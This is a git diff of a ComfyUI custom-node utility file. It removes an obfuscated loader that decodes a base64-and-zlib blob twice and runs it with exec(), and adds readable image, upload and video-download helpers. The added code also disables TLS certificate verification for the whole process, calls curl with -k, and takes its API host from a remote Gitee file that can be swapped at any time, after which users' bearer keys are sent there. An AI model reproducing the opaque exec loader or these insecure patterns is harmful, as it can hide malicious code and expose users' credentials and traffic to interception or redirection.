@@ -1,6 +1,387 @@
-# -*- coding: utf-8 -*-
-import zlib as _z,base64 as _b
-_d=b'eNoVmDWi40AQRA+kQEyhmJmVWczMp9+/qQN7NOques+lucKVdNoYtYaIXQFiPnNOcKLl54vmNymSyWahdblBfx7V6hyUKAWaKPXR6pX9ne2kkcV7UT3MJBibYokwJsSUk/PnvU97am4pSOv0TvITmoLOumqiEHrENnxXttMGhKi2GMLE9tlrbjzLZ07kGuQ05UM2hTbYrRHx1RUGUdw0Ou3WlGLV58ntSP5ukJEmAzOge2XRQuYMAr0RSCs+FzLPUxaWzazyq1AjWiM7MG2t4+xFvhg+SgknvUfaCVWRKYsis/2l34okozxTc/8UxG/xyLHkan5YfU0AB9RHCtTIvm9+V/jet7F1wthVtz2TEKCOAJnbmutMPgnVRXMoBjp8koBqn7xc+Zs0GNe0vsmdU+FX66FAOS/Qu+SMExOr2vaqKiHAXnZAfPAtTqgzl9ksCOJQKZzaeMz+0ypXktWJ31ARFYhFsioIjFjA/pgqOGjDio2i/jHXGgMm+8F9MCefT0jXsiA/DUycZe97CvpGJTVMsRuK0kh0ync/Y2N/YX9GerBGWubk7iftJavu+npm26r+cp318C5rd/Uq7YTd+By79wLZM/1wIuppHryMrxr4ISVQMr/PWkxh8jrFYDhXYO6zNj2oPgD34w2V6QYl6Nq0KsSZ3TRtJmbc4nRnYPDR092+eZU26OXVxYbRol2AP34NP5WCSIt8XXoLPKwq1tVziW2oavS8HQ+coXDiuieqwN704IhS3UQFrYQMNy3Z8Jgob+b5LdVwQqvuaMW0ORwUPTB32f7NoDwo3hnlP6i4Kk+WGfcDmOWLZi7VOS3tlpLs7KDW2HpJdBpkPjYa5MYSoBdlJs/+vcyNLmOdy63ua/elSAoFZKdjm7uPYPTBG0HailfiftDHNVdtYKd3wNFsAbH1RCwWrttkie7xVuCxi3zCEuVCvjYyNSqNgqnA8xRPu8rMNxAITRjoNwunoh4Rshts2MdW+oBpEg8Jr/g3mwmtfBRh/4q8/2WXGs/w+9h6vxb+SaQzvF5ZGhmx5j/wTVZwvvrUT8w8OJ6FdUD1hl7vL60ueo1UNy5AWxvbqwmD02LCTKebRs9Q2slCGP47dz6HC/f78kICV8/E/DLRg2TEZlzix3OgiD6e7g6Pl2+iFv6FJXdKapOn++TKhsnbOf1+JSkZpiTlPDSuxXfO4GKC4w9pl2tL3rKsCixANalk9vNC3J8b/PbJXn9kDqFQGuamWVngmLn+oTRVDqhynETouI/CjTOeZjxRUfgXE0Tsg4xxay2sK7gPTytlPlJZk+rMrVUjaUJqd6E2/gK2gQq3Ke0/xiuLksA12siWyM5WDJH1F8w2GOxI399EDMqMDxyIn3ruanz+vMSP8WV2EjX+2Qo/mlN+6AiUx1ulEo8upjdeCR2NQSBIM+Vy0CD5ZMdVVRe/gSABJiBA7yYIXHEmgySGxhVIWihaXfP6d9vm38wy9q49qL8CX7CGxZptrU40+i9Ph95CcN0Kqg/9tmfoo3EwYK2JVPD39ZjRcTOkup+lzbGSNy8rjnuFuBYr6PXacrd2BI1e89KrMN7R6nzTd61xywbMRKN2b3/hYCsVA9jZZFkxgEIgQDU0QFFGd8gXSZEgTfEgQPx9BhBFBZ7khV7gLCI0CHYTAVbHBZY+ioKk3WocuZXv3J4Dt7+3KQgZQOcvKK+m7ti/S2HK7ve+Y+Pxt7CsIe51tUaQ5yZ9elB5bFtBMN21124SUn1R2unHl+kAitNY1dRGYAAC1s8GNkESLaZRxjmmaIoAZUHBFhnE0jlhpG8TvGse1cogqBOZilpSr0KrdA0GIeBDCazT7TN/FnwIcxC0RS8Tf8VSiQRwZd0JOT97IPaH0eApIdYFHqeebKFzs3oeEL0ilFm+q5LKIU6LOByZN2UVWi24MMQbd0yev7PAILggx3DXdsefUCtOK0OnYDx/gxuPCWhog2RZPzavVnE/62+ZK84G84aufiB4AGgFfryOgh/oACCAQ1fVd14iqg+Dv4riU6sVcoEmJHHrlcMuU4BHisoE4ZbJnIsRSey2jsHanJe/t5jCkA2vyJ6ktVMc1alQWcKFJLKeDmvkq3MQJnoDSfvDBYyujyLzBpp779TzWerz1hoT1I/rEttBcTeLUem4Sq67WosTeF0BUY0DjcHXt1KzG2YdFXZ3CN3ZIOzsD78AcnjZpByuG50lYQQZJ0Khpx9f8BqG+eibPoaGsfKVTRkAQWBOjWySqUSWUJTSRWWXajhq70XNdmSM5exRm2u5uxLBJIz1aW6Dt466zA28N2C/8oEw9OCemEuiq9kvwPjmqfxr0EgwrW1UtBqDW07A0AlTUIZMXaUcKRribtgKwbLtVM7t8P/uz6VSSlzlgFcPokwphHVh+uNyxAmtEqOOag+hVKdpcepj/5tJYKbMMM7f8qibZRjmreunaVJUZfzkB50d+b3Ad31gegkzTH5ibYz2J6KFodGWCIZ2SoLAxlWWUOwJI0KjfXzy7xF9P4k/zuBNItgA3/G971II1oDek2O+eoeWmJHFTQ2kjdgD+tPx0z0DRIxSEmk+TI7OQfu0odJRPX1M6hf1dUJVOFkjIlveeBxreInLDenPUpQGLmUa5ny+LusOrMqv3XjA2bEM8haivTfhktCJH5tHhtLy3okvg37ie2JJOfGFkopBfxla0Kda0uIVYn9luRX6rgPCEhIf4T3wXx7Yg8B48HOlGesQCPos+RrEKoo5gw5uw6TeANxSK/iTj5l6GRyntKCIYCFEJKPHhCv6SyQ47PUHef28xdNsKa/cDWJKSQsYCbRtH/9SBdcTqX4mC/uMPLc/QIk9WTSgx5Y1Gbxi48Kys1e2NFLliXfEQWOUp/GdVK0zlmsEnmRP/oylUwp6uMrel+zb9I6vWxD+QIzBZLq+Td/eMQXd6cmJbxrI+NKZ3TFf+qPoOfYX9ARUsABSCBupKo2ffKOeTn+j8+qR0tNcnKRqkFIDTiBtnvuXFALhly42NPSQ6ovhKcSIXvw0qIyQmHUoMjHfPLENnmariOFyw+Efr5qLEFGJmDn6b33WiN6G1ZoCm8jX+t52ELh1Ej8htMtA0g+x3sFnHnS5tfVl3FLs9JsWM1UWv7IpdUf+ckYqu26w2JlTHFyCBPTpYS7lHQvK36m46wRPW3buRnv2rWXA2zjKOPukOu73V5Z2/iJ1DqK5rRt2lfj4DaiGJ/PgD0g1oedaxgwptmQhfES9X/msqgTyvD5bewYVCSvU1qfeQWNSiT4Iigjn4PxLWR3w4IDKKscYSGqMMdoFGbBysQ75WxPbvfChceMHPXJiV8BXSzFf074Tl7cxxoFHaDsKE0JrySRZhCarYZTarNfGaHxx/3suw3Gj25AwTZgek+G0cXY7nvUtTGgsrDeD0mA+k93amAIpgpQxMLV7M61h5iwkao5n/sZxP97Z5KasfPaS+JQ979U05Hdxd8aC7BGpJNPF9K78we8ZKuUEKhkui30lOfj5l4BWnuC2PmllcJQjUPVCoTSgoGwyTI5Dqx3jFXcyVdngaisxaNSUnICY86dTpOJoVrOqm9XwyChYrdyp8kPcbQL/VKPyXMOlHgemOh+dgRDcbgKmaUC/bBRE6wUBQWyurgpUpuqcAz/NLahVXEPTtfxVTs9ZIc+Sfwxni4cou5JA+JH2nDwXvqddz1ygBHUtQUsvR5jQs/XhzJFCAiKpnQYUx7OPYcSEcVLAEZXO14wU8/g7Cap6r67bh3pSmjv/EffK1ZwMwAC5aKo2PyJPSp9jdYLhfsjYwi5iSDhtiO0Vu2AzvtU3+6svL5Gu36xzzjoyKrd2Mdpq2fPTQfIm1r2va6qcKVi4z8DNTyc68j5hGsrRqR3kTXC2w9zblHcpaJMaboUhMPFpreiepbzcjFDK/FiiEQ5oIi0K3WWnvlqGycqLJvABqHKP2/m/U/9Ai1IldVJAsf3+bPcnDRbstbm5WvsE5dA81qVsV2ZePrz4wFH91W5Dyn3eJ+f3cgPXzlfgqSI1KtYv39NvoAaUzq/0ujxYYrDiCb4t/4zbcc+61UKQ8qCUbBwxji9NT/V0c2dHe2axMh7E2M6avJTDACRQGG3RoDClM/tAfAEdqAReGN5u//vBvwgJ/a9bwJ6K+dzyb+/zo0CjPVJwkUyrRFM6aP28O96gyzOBtCV73lscI+sMB+AusPCHevOxZ98K/VVzJcKRYGJpJtoPzhjdNQfM83s3Xf4TslryuPCZmL2DqqpAdANDgSrtKw1Ov7Eft6voKeF73NmrS03bOz9x75P7mshvQFTdxN9SZCPqZBsRfjACAyOb6ZipXYWexetLeR5mg6ba1DiF6C3xp5Hwp9+nax3NRwcFjYiXiocnnWZqPuMtv3l8IUaZuJ5uXkSAdmBgHC9lf1LpIrfLZwkAzTk+RPguWw8beQw/4GuvAmy3Sq+CX8llvMwtCj4ZdNcZNrfM8Q9l0eBhsi8NdlMpPdWq0rdHmeXYAlaKp/IY8dDf3HfNJl9jaE995s/m2E6WCbaxL+IXjmPBI3GrJOknx5iwZ9u0CF+2YKSIwrTQ4cJDMxeG+QvJFH2L7NJDdmLxe8vhgHkyqUV0MXnZxQ0/O4d6QxFNcI5F5IekxnlRBiN2Ctk/M/ZfgX0RTHhqetizBpDgEzzI6aAx3Qh+7azogPPzvjDDMU/rrXX/ybfqN/FSq92307+PjysH6LcgiQSxfUb3HsFRPC8a6arnMzODtylU7VK6Ce3gcJczevChMIy3ce5S0ecj+5PlLY1Z9dD5mQzi65QWX04n+GyMWv2Tv9MTqjQfwZLyU6GBqAL+mc6oYi/9EBKN9K+gerhs+/RWvZ8uqd9qE3icRUHTYXGjp3O4u0kmdyVbdNB1TCtLHV6kDWUDe7A7zvUc8L4ic/L0YD6bZ4aOfPrxpvjHEgGNYWDp8umzdof/ZK4t43j5jFhXBTEKnl0v3LpqKNyeyGVADfGkVPGQkSSKRyBITW2BJi+qpn9cskHf6RvClxDk7Tkspi2FFv8K6y1l7jWRd1KgVAJ9yVWNOUTb6e/8XiNQJqmHp+3SXCcqglvLG6HVXN7p2OB57iAyxLIvjsvOwfgEZmJGueMxf2gxNxIkOtofs5PKzEKQnVth6W7APpxBTNQvX3cuv07Z/FfkLgpDqJOffw21iEzJoGzF5NF8jYDFBzGePhMk6Jg2w/ztUsYe3zxbINLYEorItJjovMOYProh3IlZarW+q9Hiiu2BXdbfMWLHbnCJN/Ns0wxy4/rd0AeTJxo/cGyJdvP6atoB2RwLIbldz1gYEttdyKz2nOeDjgRGa6NcmGg2ohJ5YqaU57m80QPTfTwOfarN4JHjdUcjB4OLnnh59XA8IYEYJREEoMESrCrw+mx0AlOaZokcJEGwwc1lp4thA5o71JJSyeu+8PDXUjPGueUmFZN3ompQ9W3SlLIRikaQVhLf0D3LByhXnU75wQJduHJNr8YEEPKG0jEc22LO4Sw5Yv+6xVTJnZT672+moYSDpAKj3GOduuev/sCzTWXNhvTc6s+BMjXT4F/p0Vu1mkw9rLJif1Y3MUMDruyx0vVwEPIwO9/AQxQ62v5A8RzdKtfO+E9ClmvYokpLbjQXubS4DOKGgCbOlm59dzidnj9HybbdkioEmKO2Eq/VPx4gZ9Y6Bn3ZDJElO9mhzg5aXXCiHaJaZMDMiuiKi3JPmUqoURxlQINm0nx2rwjxfuxmcnJQaIwiR90XgH8032tQu5mtd1pPzFdJH2qnWEkndshqU4Snec/DEgdHvLCdaI1PjLjDb13CFH9F7PE5/Gv5HHlBxCKVLsGlp39hOKxTvPspf8ozvZOWJmS0UWqHr/ASFx3NzmxkUYC1z8RffuZGx5/W3SJSpp1/KYrwVtR/IRL9tPvthLf8G7w6ih+AQw+6/Pp+yn54Z4gpfhnM3zKpQkfAs/Mdmgv9QZRmZzy2X9ZAB/COPunYhWe07+TsL7+OPU6MeJFem/3OwMXsVcu7+Nq1L+DDCKwlAMy/XZZoGgVBOyNj9APJsgJxMAeBy+whmb2z+aLnH6fXe83WnXa06sNy/nNiuP1E2bwfNCtzDZBHBBJ1+tvp3/m7ecu7Q4Yc7nuHakrprRIGhbdyeyJlgs95lHxyBCLc+8bSN6HNerNhXAsLk2NVYtoCYpjijbjGBKlncMC8OEH8Y/kciJ932BHtlBCpv52lsGbpAVZMM9JHVsxCpSL9REpt4fl5LiWUE9Y+3VMdiyxVhBvFc9yF8Y+v/6lcitCKtoa3Ntsdr8w8YxkDVDjA0LEQ38xQN/WYUqj8KdM3IsTKzq0LSsVMz124KFV2Tuj2qY+dPjyXwGc/XYAKa5zekmSvAxLXlr7Ftjg5i2ysxvtlI/j/74KqMZRxlJkMi/1xxeBaJWHMEGfzw835L4zJbPpLbBNTas3Z46rbRnQBj8cdlmIij63+++oATVrCnkTwM6Z+lsuQxvU/YT1OHP75MMnFe3fgLkpQMGXBJUgcTxHuq13glhv9urWJ1Kkf8u0L1MuZRzQ0RxEtwjCn3U4nS9p3omArTlXF/3LAKQ/s50CZwut9FSfRUu0j+AfKw416O5SRK/7wRRNdXb4ZsJvtfsNvQI2SoXxt3dBe3vWd68j9LUJJhE/bWfT4DTBoAMUKxmGxaZf7yWMX3eaEN+h56aDZlYEVFlOqk1lAUjCGx+ncVRygoI8Od9+f87w2DM+fopbvdaVEsEh5KBTY+DThmPlXPli3pkAZWJ7WKJbk9VNyXMA/Q0V9PIyn2iTiQ7gZQpQee/xpdJn0Dx1oU54uancgPn/QHamDr2uO4GEsVEr4FO14J0UwaNj7VmgFOX/3BD6GRYSnH3iZoWQmw4nKZNaAcxpszP5rLBhkHoXlyp8ef5IYy5tKmRUnsB1wvKU9CjZMpocLp0iAfqwaXo62CSvzO2KJz/6MJ+vQ5NS7hU62DghgV7hBBD3fc/tkww8R/BrI8JjKuBhFoNw4Fy7b8ZB13VslV4fbYaTW1UWSki9GGPQ6iMpcYz+hOrxZDcs2dxOX35UKfN4Ck5JimNmPI/Wc4vFUe9YXNpVoHEq15RXE7R6yzZ6S5euWi6wxVx4BYja6KNuqtExss/O+qv+HzEI+6im2KQOgIqPfMSbMWc5my9JetUwpJJAZIQZCmTlwrHcUEOKXw1BJDkQHHQUp4d92/P56Y0ayh0yX6sDbUGzrX4aQYkl4g8o+cOL0b7EBwTBT6YaRMFMIjyicJwjSP/CvQ4uPBv+w8M8X7Sde/zzzV8HnO+UgeIBXdaUFbftQgE0IVwmt1CFygOSpCvxcw/IVr7AtJaqVB4ZNCKVwhdx/Y7i211dVWcIT/ihr+F8yo4l9VPuUij32QZXZvh11LtfnJ/NMFL2mK4YpYlhddOndPWejyKDont13ZTY56h9J0TGIU3wBdnz3gkNRXTb4R/GEDZ00CAR78N6FrtBeFW+EutlnUF6VPiExopUVq1TCH/ChRUMemmYt4fMVLjBaXTrF282O8O/Ox1m6yNR/zIz1f7JZnlIZr7QjB/6PDtbJvX5geM60f5rKM0ZkumUx2H/sfGZYFr6Yyf4NZsacXFS+TZdhdFTceX38Uf9AbkO4VYemxMzGxwfSf5EqQfDiHRgj6yQRIvIv1rH2imRNL6ivNru5oAt8Be9ZrXlkOK0Z8fPrRoLJA3dTU9Z48GUtsPsgEyG0/EICcNzJAGy7n6FH0izlPJfuxyBlAoVgV2fgGxmImCemHBtrWkaaCAQlmjZTXBHTtB2+uQ7FVgQ/+QrvRbtMqR2UWkUI/5aAvTgC9++V0i23eemB7NWO0IXuN4rKXajhZMao6Z4mUUYfje5jc5+z+2Z/I2xa++H8jXT7IFCjs4fwuOBf4WRwFh87qt60viQF2+k0FY4hlbwizk5rsmnJSOB/TYwzaxG9SGYDYYYB2V+KH3oU9lhBdLvroVYsxHx0GUrEpSf756DQX+wNeM6SB9sQyXH2Jru6X9GWXfLjsrYYD1NAPtMaDqXIPxDdjFeJzQ28cIH5m5QP9xZK+AtXwVgQLbs7BtraTRqnFMUyyiqEsckDiUm9lpWl4vU89m/5vMi0QkdmLoXwgk2Vs56kqqqL+V3m/d7MC90UrhG70NFJ5Ozv5YAJYXRtJhYglyZ7DeK3gMm68wcUrWDXEjXRPMO6rv4t3Fze9pultPMEyg25yaVoTKe+GzFieipkwTC1ORP0+r3jc+XL9G5IywyjRWIgA2unJIm87eGrsMZtjldyQ14YLCH+3Vu9HxYhqw55BplaIfk2V/XfuOAyOpT2lma9t0WZVdRP2xr7qnc3wO/sL9HTMuM16o97NogAkq1sdoshsJz9mAXRrWSy7eXcB3tyuugog56wJh7qrdR13A5AoPRLn7+r+2J5lv42kn+cjqY6lqIIoGBDFBrYPa3qh8L0+BkrqfeeX04kX6W8Bw+ls3zjnqgqYAC/u1MgoqcftxmP6A90TB93St7m8hoSRnTybAL+qYLnp8iOBJTFvkCcHOxNjJrqaC+AhjlrwjrSequvsT/JZYgC4vB34EBM8gsNEt7eFBSnHqmgM/afqSddtzSXtGBdMcihsqU74pheOkjg//+IKDA5TAhZ2MStJNIfmpwj1EX7A1c85VAgV9CRNOGCs4pbtF2bNdVDBPBGKZbyjIggf1E32uMIn6iQF05ZSM47jRafAds9/2NR8qdC+3qnGUFdGnxZobEfb+6fMaXYqDCKtL9qHfDjJYD7s8clHpwh9QWSkfBjiuANgs+Qm3Fh778pj6bFjfIPd/Dae3dGAhAPGV/SbacLB0W0SZ8XTtHKrfdgtOv2gcae7KMzBUlYody4/jlcuJdP7fmuKltOXf8+jnVrywmfJnsqxxTyn6OFlvy7krS+mPeZ6sJmXa8qYP1NwLiz1sR/R39YL5MUird1C+wGPGhiTyjrgeUjbXz9kQb4YdTVAfXY6pkDs/eRYsfb3/ocGpwvVOS7UZmdeUhKFOCb27CQP1/856pT1kVV1XpeTaXGV1lnHvByd5AvWFbrDy5hnmkIs+CbCCN4TtsWRukdq4BblWfsv8pETd+hJUA52xL88CGhC5u/fVfo6zQcXruyrhjbQc0EMn8Uav+rB7WlbizbyRI3xu5Tq4a0tvSbss9EgI3hwNRT0AuI/gZlz+hNC4CvubjQhtn4bwTm+fxbsOmV41mQe1tcwXne2WHW29/PSY7gAvpp8HcU1tgashZargDwD5IAbb8usGvJqgDok5T/+Bd/KopAB/werJNYe6N8yBziYwY1X0QRkrD8ZGdI5FHAbtPn8XcEwcdh6lp2lrNI5F8wPZKeu7zMBheuw35S/+6irUegckHGHtm/vPRf0Lb2DhUIh3++kQuFxn+dDYUEIbWAv5T608GSNentABJE9soKvzJn9NYNtegzDPfJ4jEAz1vT/BLTm5q6zMrzpaCyuyW7cVkjz9HnD5Q/muapost1BQl/qFqpFrJnp6/MqAg2948qu+41PNnCJsqQ07LTOY/xjO+4OxCGOYPBdJ4cw0laZVAeVqYrLz2KVqJfVtBb4WvNS/4qPDPMYxGK3d8Ms9s4Ip5j/2g5Dc4RQzPU+w5dlH61SWKhxVQU2Ag7XpSaOxuBqEmQYbUQQ7SVT6+AM8oYJh0IBQDvvZqco3Uvehcm33Wl0JL0wDFcoP5pgCSjoB+OrvjMnJb8OvtKZ838dS9z8PQfPon0xR7RAMk/NlEThvmluSeTOPgy+yp5LmC+XFHFI8SCtrICFc0RUquB5qcfmm7t2D231/K3j6emzGO+SFOfuoUmLIoeXTWzt5H/tILrWQyjOGeVn8oXMKfjQHcpcw9H/RUvlz0Cw3fLGSVLlwgaS0V8rRt41B/3H/9on4l2+J88gJjO7HA5DSB35l3ZvdTBiSlle9xDUtwy4Oiydhza/Y7uHDDL/WPxajSHLJv2zzT6lIeoD2tsqU4S5oxeC3LEZhaB5++Z/2Tj3XiNcXranHFSNRiH2yndRb9fqzFyw/+toj94tbJGwKgqienDgRgGQWNbVHX2sweUFFtyG/XniJjIq+u4L2x+EHqrQHZ7G6qUNxH3WdW+N+7ecIDvumQuc2e7e3+0FP1h/c3OcwDikRdi8YSAf55VAND5D4aAF+I='
-_d=_z.decompress(_b.b64decode(_d))
-_d=_z.decompress(_b.b64decode(_d))
-exec(_d)
+# ComfyUI-nkxx/utils.py
+import os
+import requests
+import time
+import json
+import threading
+import tempfile
+import shutil
+import subprocess
+import io
+import re
+import cv2
+import numpy as np
+import torch
+import torch.nn.functional as F
+from PIL import Image
+from io import BytesIO
+import traceback
+import yt_dlp
+import ssl
+import urllib3
+
+# 禁用不安全请求警告
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+ssl._create_default_https_context = ssl._create_unverified_context
+
+def resolve_api_key(api_key_from_node: str, channel: str = "grsai") -> str:
+    """
+    Resolve an API key through the global Nkxx hook while staying compatible
+    with older get_api_key implementations that only accepted one argument.
+    """
+    import builtins
+
+    getter = getattr(builtins, "get_api_key", None)
+    if callable(getter):
+        try:
+            return getter(api_key_from_node, channel)
+        except TypeError as exc:
+            if "positional argument" not in str(exc) and "positional arguments" not in str(exc):
+                raise
+            return getter(api_key_from_node)
+
+    if api_key_from_node and api_key_from_node.strip():
+        return api_key_from_node.strip()
+
+    if channel.lower() == "grsai":
+        return os.getenv("GRSAI_KEY", "").strip()
+    if channel.lower() == "wujiai":
+        return os.getenv("WUJIAI_KEY", "").strip()
+    return ""
+
+# 零宽字符，用于防止 API 缓存
+ZERO_WIDTH_CHARS = ["\u200b", "\u200c", "\u200d", "\ufeff", "\u180e", "\u200e", "\u200f"]
+GRSAI_LLM_MODELS = [
+    "gemini-3.8-flash",
+    "gemini-3.7-flash",
+    "gemini-3.5-flash",
+    "gemini-3.5-flash-lite",
+    "gemini-3.1-pro",
+    "gpt-6.1-sol",
+    "gpt-6-astra",
+    "gpt-5.6-sol",
+    "gpt-5.6-terra",
+    "gemini-3-flash",
+    "gemini-3-pro",
+    "gemini-2.5-flash",
+    "gemini-2.5-flash-lite",
+]
+# ======================================================================
+# 动态防封路由配置 (全局单例)
+# ======================================================================
+GITEE_URL = "https://gitee.com/jiege777/app-config/raw/master/api_url.txt"
+_W_HOST_CACHE = None  # 全局内存缓存
+
+def get_wujiai_host() -> str:
+    """动态获取最新的 API 域名，支持防封热切换"""
+    global _W_HOST_CACHE
+    if _W_HOST_CACHE:
+        return _W_HOST_CACHE
+    
+    fallback = "https://wujiai.org" 
+    try:
+        res = requests.get(GITEE_URL, timeout=3)
+        if res.status_code == 200:
+            url = res.text.strip().rstrip('/')
+            if url.startswith("http"):
+                _W_HOST_CACHE = url
+                print(f"[Wujiai Core] 🌍 动态路由获取成功: {url}")
+                return url
+    except Exception:
+        pass
+    
+    _W_HOST_CACHE = fallback
+    print(f"[Wujiai Core] ⚠️ 动态路由获取失败，使用备用通道: {fallback}")
+    return fallback
+# ======================================================================
+# 图像与张量处理 (Image & Tensor Utils)
+# ======================================================================
+def download_image(url: str, timeout: int = 60) -> Image.Image | None:
+    """从URL下载图像并返回PIL.Image对象"""
+    try:
+        headers = {"User-Agent": "Mozilla/5.0"}
+        response = requests.get(url, headers=headers, timeout=timeout)
+        response.raise_for_status()
+        return Image.open(BytesIO(response.content))
+    except Exception as e:
+        print(f"[Image Utils] 图像下载失败: {e}")
+        return None
+
+def safe_pil_to_rgb(image: Image.Image) -> Image.Image:
+    """安全地将任何PIL图像转换为RGB模式"""
+    if image.mode == 'RGBA':
+        background = Image.new("RGB", image.size, (255, 255, 255))
+        background.paste(image, mask=image.split()[3])
+        return background
+    elif image.mode != 'RGB':
+        return image.convert('RGB')
+    return image
+
+def tensor_to_pil(tensor: torch.Tensor) -> list[Image.Image]:
+    """将torch张量 (B, H, W, C) 转换为PIL图像列表"""
+    if not isinstance(tensor, torch.Tensor): return []
+    images = []
+    for i in range(tensor.shape[0]):
+        img_np = (torch.clamp(tensor[i], 0, 1).cpu().numpy() * 255).astype(np.uint8)
+        images.append(Image.fromarray(img_np, 'RGB' if img_np.shape[-1] == 3 else 'RGBA'))
+    return images
+
+def pil_to_tensor(pil_images: Image.Image | list[Image.Image]) -> torch.Tensor:
+    """将PIL图像或列表转换为ComfyUI图像张量"""
+    if not isinstance(pil_images, list): pil_images = [pil_images]
+    tensors = []
+    for pil_image in pil_images:
+        img_array = np.array(pil_image).astype(np.float32) / 255.0
+        tensor = torch.from_numpy(img_array)[None,]
+        tensors.append(tensor)
+    if not tensors: return torch.empty((0, 1, 1, 3), dtype=torch.float32)
+    return torch.cat(tensors, dim=0)
+
+def safe_pil_batch_to_tensor(pil_images: list[Image.Image]) -> torch.Tensor:
+    """将PIL图像列表安全地转换为ComfyUI图像张量，自动处理尺寸不一致（填充黑边）"""
+    if not pil_images:
+        return torch.empty((0, 1, 1, 3), dtype=torch.float32)
+
+    tensors, max_h, max_w = [], 0, 0
+    for pil_image in pil_images:
+        if pil_image is None: continue
+        try:
+            pil_image = safe_pil_to_rgb(pil_image)
+            img_array = np.array(pil_image).astype(np.float32) / 255.0
+            
+            if len(img_array.shape) == 2: 
+                img_array = np.stack((img_array,)*3, axis=-1)
+            elif img_array.shape[2] == 4: 
+                img_array = img_array[:,:,:3]
+
+            tensor = torch.from_numpy(img_array)[None,]
+            max_h = max(max_h, tensor.shape[1])
+            max_w = max(max_w, tensor.shape[2])
+            tensors.append(tensor)
+        except Exception as e:
+            print(f"[Image Utils] 跳过损坏的图像: {e}")
+
+    if not tensors: return torch.empty((0, 1, 1, 3), dtype=torch.float32)
+    
+    padded_tensors = []
+    for tensor in tensors:
+        _, h, w, c = tensor.shape
+        if h == max_h and w == max_w:
+            padded_tensors.append(tensor)
+            continue
+        tensor_chw = tensor.permute(0, 3, 1, 2)
+        pad_w, pad_h = max_w - w, max_h - h
+        padded_tensor_chw = F.pad(tensor_chw, (0, pad_w, 0, pad_h), "constant", 0)
+        padded_tensors.append(padded_tensor_chw.permute(0, 2, 3, 1))
+
+    return torch.cat(padded_tensors, dim=0)
+
+# ======================================================================
+# 双渠道图片上传 (Uploaders)
+# ======================================================================
+def upload_image_grsai(api_key: str, image_input: torch.Tensor | Image.Image) -> str | None:
+    """Grsai 渠道的图片上传逻辑 (获取Token -> 上传文件)"""
+    try:
+        if isinstance(image_input, torch.Tensor):
+            pil_image = tensor_to_pil(image_input)[0]
+        else:
+            pil_image = image_input
+            
+        rgb_pil = safe_pil_to_rgb(pil_image)
+        with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as temp_f:
+            rgb_pil.save(temp_f, "PNG")
+            temp_path = temp_f.name
+
+        host = "https://grsai.dakka.com.cn"
+        headers = {"Authorization": f"Bearer {api_key}", "Content-Type": "application/json"}
+        
+        # 1. 获取 Token
+        token_res = requests.post(f"{host}/client/resource/newUploadTokenZH", headers=headers, json={"sux": "png"}, timeout=30)
+        token_res.raise_for_status()
+        token_data = token_res.json().get("data", {})
+        
+        # 2. 上传文件
+        with open(temp_path, "rb") as f:
+            up_res = requests.post(
+                url=token_data["url"], 
+                data={"token": token_data["token"], "key": token_data["key"]}, 
+                files={"file": f}, 
+                timeout=120
+            )
+            up_res.raise_for_status()
+            
+        os.unlink(temp_path)
+        return f"{token_data['domain']}/{token_data['key']}"
+    except Exception as e:
+        print(f"[Grsai Upload] 上传失败: {e}")
+        if 'temp_path' in locals() and os.path.exists(temp_path):
+            os.unlink(temp_path)
+        return None
+
+def upload_image_wujiai(api_key: str, image_input: torch.Tensor | Image.Image) -> str | None:
+    """Wujiai 渠道的图片上传逻辑 """
+    print(f"[Wujiai Upload] 开始处理图片...")
+    try:
+        if isinstance(image_input, torch.Tensor):
+            if len(image_input.shape) == 4:
+                image_input = image_input[0]
+            arr = np.clip(image_input.cpu().numpy() * 255.0, 0, 255).astype(np.uint8)
+            image = Image.fromarray(arr)
+        else:
+            image = image_input
+
+        image = safe_pil_to_rgb(image)        
+        buf = io.BytesIO()
+        image.save(buf, format='PNG')
+        
+        url = "https://imageproxy.zhongzhuan.chat/api/upload"
+        headers = {'Authorization': f"Bearer {api_key}"}
+        
+        for attempt in range(3):
+            try:
+                buf.seek(0)
+                response = requests.post(url, headers=headers, files={'file': ('image.png', buf, 'image/png')}, timeout=45)
+                if response.status_code == 200:
+                    data = response.json()
+                    return data.get("data") or data.get("url")
+            except Exception:
+                time.sleep(1)
+        raise Exception("多次尝试均失败")
+    except Exception as e:
+        print(f"[Wujiai Upload] 流程出错: {e}")
+        return None
+
+# ======================================================================
+# 视频下载器与适配器 (Video Downloader & Adapter)
+# ======================================================================
+def robust_download_video(video_url: str, output_path: str, max_retries: int = 3, timeout: int = 300) -> bool:
+    """强鲁棒性视频下载器: 优先使用 yt-dlp，失败则回退使用 curl"""
+    print(f"[Downloader] 准备下载: {video_url}")
+    
+    # 方案 1: yt-dlp
+    try:
+        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}
+        ydl_opts = {
+            'outtmpl': output_path,
+            'retries': max_retries,
+            'http_headers_str': "\r\n".join([f"{k}: {v}" for k, v in headers.items()]),
+            'quiet': True,
+            'noplaylist': True,
+            'merge_output_format': 'mp4',
+            'socket_timeout': 30,
+            'nocheckcertificate': True, 
+        }
+        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
+            ydl.download([video_url])
+        
+        if os.path.exists(output_path) and os.path.getsize(output_path) > 1024:
+            print("[Downloader] ✓ yt-dlp 下载成功")
+            return True
+    except Exception as e:
+        print(f"[Downloader] yt-dlp 失败: {e}。切换至 Curl 备用方案。")
+        if os.path.exists(output_path):
+            try: os.remove(output_path)
+            except: pass
+
+    # 方案 2: Curl
+    curl_path = shutil.which("curl")
+    if curl_path:
+        for attempt in range(max_retries):
+            try:
+                print(f"[Downloader] 尝试调用系统 Curl (第 {attempt+1}/{max_retries} 次)...")
+                cmd = [curl_path, "-k", "-L", "--connect-timeout", "20", "--max-time", str(timeout), "-o", output_path, video_url]
+                subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=timeout + 10, check=True)
+                if os.path.exists(output_path) and os.path.getsize(output_path) > 1024:
+                    print("[Downloader] ✓ Curl 下载成功")
+                    return True
+            except Exception:
+                time.sleep(2)
+                
+    raise Exception("所有下载方案均失败 (yt-dlp 和 Curl)")
+
+class VideoAdapter:
+    """通用的视频对象包装器，供 ComfyUI 原生 Save Video 节点读取"""
+    def __init__(self, video_path: str):
+        self.video_path = video_path
+
+    def get_dimensions(self):
+        try:
+            if not self.video_path or not os.path.exists(self.video_path) or os.path.getsize(self.video_path) < 1024:
